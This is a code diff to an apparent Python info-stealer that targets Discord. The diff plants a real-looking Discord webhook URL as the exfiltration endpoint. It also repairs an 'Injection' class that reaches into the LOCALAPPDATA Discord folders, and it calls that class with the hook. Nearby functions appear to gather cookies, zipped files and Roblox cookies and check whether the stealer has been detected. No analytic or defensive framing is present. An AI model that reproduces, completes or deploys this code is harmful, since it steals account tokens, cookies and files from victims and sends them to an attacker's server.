@@ -27,7 +27,7 @@ else:
     quit()
 
 #https://canary.discord.com/api/webhooks/1078237508833390683/4lQklEhIbk-T8H7Bfw6mPWipA3onoRfHu-o9BW7yHQvxyLtKjm4gHq-qq8DTrfDO19aU
-hook = "WEBHOOK HERE"
+hook = "https://canary.discord.com/api/webhooks/1078237508833390683/4lQklEhIbk-T8H7Bfw6mPWipA3onoRfHu-o9BW7yHQvxyLtKjm4gHq-qq8DTrfDO19aU"
 
 try:
     import requests
@@ -876,8 +876,8 @@ def GatherZips(paths1, paths2, paths3):
     }
 
 
-def Injection():
-    def __init__(self, hook: str):
+class Injection():
+    def __init__(self, hook):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
@@ -1310,7 +1310,7 @@ OtherZip = []
 
 GatherAll()
 #RobloxCookie()
-Injection()
+Injection(hook)
 DETECTED = Trust(Cookies)
 # DETECTED = False
 if not DETECTED:
